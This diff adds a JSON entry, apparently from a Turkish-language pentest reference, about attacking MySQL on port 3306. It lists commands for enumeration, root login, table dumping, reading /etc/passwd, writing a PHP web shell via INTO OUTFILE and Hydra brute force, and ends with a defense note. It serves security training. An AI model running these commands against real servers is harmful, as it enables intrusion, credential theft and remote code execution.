@@ -1,0 +1,62 @@
+{
+  "port": 3306,
+  "service": "MySQL",
+  "protocol": "TCP",
+  "description": "MySQL veritabanı sunucusu. İnternete açık MySQL kritik risk oluşturur; brute force, root@localhost izni ve UDF (User Defined Function) ile kod çalıştırma saldırılarına açıktır.",
+  "risk": "high",
+  "sections": [
+    {
+      "id": "enum",
+      "title": "MySQL Enumeration",
+      "commands": [
+        {
+          "label": "Nmap MySQL Script Taraması",
+          "command": "nmap -sV -p 3306 --script mysql-info,mysql-databases,mysql-empty-password,mysql-vuln-cve2012-2122 192.168.1.105",
+          "description": "MySQL versiyon, boş şifreli hesaplar ve CVE-2012-2122 tespiti",
+          "output": "3306/tcp open mysql MySQL 5.7.32\n| mysql-empty-password:\n|   anonymous: Empty password!"
+        }
+      ]
+    },
+    {
+      "id": "access",
+      "title": "MySQL Bağlantı ve Sorgular",
+      "commands": [
+        {
+          "label": "Uzak MySQL Bağlantısı",
+          "command": "mysql -h 192.168.1.105 -u root -p",
+          "description": "Senaryo: Ele geçirilen kimlik bilgileriyle MySQL'e bağlan"
+        },
+        {
+          "label": "Temel MySQL Keşif Sorguları",
+          "command": "SHOW DATABASES; USE webapp; SHOW TABLES; SELECT * FROM users;",
+          "description": "Senaryo: MySQL shell'inde veritabanı, tablo ve veri keşfi",
+          "output": "+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n|  1 | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |"
+        },
+        {
+          "label": "LOAD_FILE ile Dosya Okuma",
+          "command": "SELECT LOAD_FILE('/etc/passwd');",
+          "description": "Senaryo: MySQL FILE yetkisi varsa sistem dosyalarını oku",
+          "tip": "MySQL kullanıcısının FILE yetkisi olması ve secure_file_priv='' olması gerekir."
+        },
+        {
+          "label": "INTO OUTFILE ile Web Shell",
+          "command": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
+          "description": "Senaryo: MySQL'den web shell yaz — webroot yazılabilirse RCE",
+          "warning": "YALNIZCA yetkili lab ortamında kullanın."
+        }
+      ]
+    },
+    {
+      "id": "bruteforce",
+      "title": "MySQL Brute Force",
+      "commands": [
+        {
+          "label": "Hydra MySQL Brute Force",
+          "command": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.105",
+          "description": "MySQL root hesabı için parola brute force"
+        }
+      ]
+    }
+  ],
+  "defenseNote": "MySQL güvenlik önlemleri: MySQL'i localhost'a bağla (bind-address=127.0.0.1). Root hesabını uzaktan erişime kapatın. secure_file_priv ile dosya işlemlerini kısıtlayın. Kullanıcılara en az yetki verin (LEAST PRIVILEGE). Güçlü parola politikası uygulayın. MySQL loglarını izleyin (general_log, slow_query_log)."
+}
